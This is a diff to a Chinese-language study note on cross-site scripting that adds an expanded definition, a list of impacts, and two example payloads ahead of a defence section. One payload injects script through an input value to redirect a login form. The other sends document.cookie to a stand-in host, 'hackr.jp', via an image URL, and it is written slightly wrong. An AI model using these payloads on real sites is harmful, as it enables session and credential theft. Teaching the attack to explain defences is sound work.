@@ -1,5 +1,11 @@
 #### 基本概念
-XSS：跨站脚本攻击，英文名称是Cross Site Script，XSS攻击，通常指黑客通过注入非法的 html 标签或者 javascript 代码，从而在用户浏览网页时，控制用户浏览器的一种攻击。举个例子：某个黑客发表了一篇文章其中包含了恶意的JS代码，所有访问这篇文章的人都会执行这段JS代码，这样就完成XSS攻击。
+XSS：跨站脚本攻击，英文名称是Cross Site Script，XSS攻击，通常指黑客在存有安全漏洞的网站注入非法的 html 标签或者 javascript 代码，从而在用户浏览网页时，浏览器运行攻击代码，达到控制用户浏览器目的的一种攻击。举个例子：某个黑客发表了一篇文章其中包含了恶意的JS代码，所有访问这篇文章的人都会执行这段JS代码，这样就完成XSS攻击。
+> XSS属于因输出值转义不完全引发的安全漏洞
+
+#### 影响
+1. 利用虚假输入表单骗取用户信息
+2. 利用脚本窃取cookie，从而帮助攻击者发送恶意请求
+3. 显示伪造的文章图片
 
 #### 类型
 DOM xss
@@ -8,6 +14,24 @@ DOM xss
 
 
 #### 实现
+例如：典型的表单圈套
+```javascript
+<div>
+    <img src='...gif' alt='拍卖会'>
+</div>
+<form action='http://example.jp/login' method='get' id='login'>
+<div>
+  ID<input type='text' name='ID' value='"><script>var+f=document.getElementById('login');+f.action='目标网址';+f.method='get';<script><span+s="'/>
+</div>
+```
+
+再如：
+```javascript
+var content=escape(document.cookie)//编码成字符串，现在用encodeURI 代替
+document.write('<img src=http://hackr.jp/?');
+document.write('content');
+document.write('>');
+```
 
 #### 防御
 1. HttpOnly：
